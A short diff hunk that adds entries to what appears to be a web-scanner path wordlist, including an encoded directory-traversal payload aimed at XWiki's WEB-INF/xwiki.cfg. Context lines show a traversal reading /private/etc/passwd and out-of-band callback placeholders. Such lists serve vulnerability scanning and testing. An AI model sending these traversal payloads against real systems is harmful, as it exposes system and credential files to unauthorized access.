@@ -8946,3 +8946,5 @@ test&access={{interactsh-url}}&remote_url={{interactsh-url}}&admin={{interactsh-
 /ViewSource/?file=de/robv/android/xposed/installer/repo/RepoDb.java&md5=36570c6fac687ffe08107e6a72bd3da7/../../../../../../../../../../../private/etc/passwd%00&type=apk
 /wp-content/plugins/acclectic-media-organizer/readme.txt
 /ckfinder/ckfinder.html
+/wp-content/plugins/chatbot-chatgpt/readme.txt
+/xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg
